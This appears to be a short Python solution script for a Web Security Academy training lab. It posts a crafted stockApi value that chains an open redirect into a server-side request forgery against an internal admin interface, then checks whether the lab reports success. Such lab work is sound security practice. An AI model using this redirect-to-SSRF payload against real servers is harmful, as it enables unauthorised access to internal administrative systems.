import requests


lab_id = '0aab00be033440d882804c8c00c5006e' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/product/stock"


# redirect vulnerablity in the nextProduct -> path variable within the stockapi
data = {'stockApi': '/product/nextProduct?path=http://192.168.0.12:8080/admin/'}


r = requests.post(uri, data=data)
if "Congratulations" in r.text:
    print("solved")
else:
    print("nope")
    print(r.text)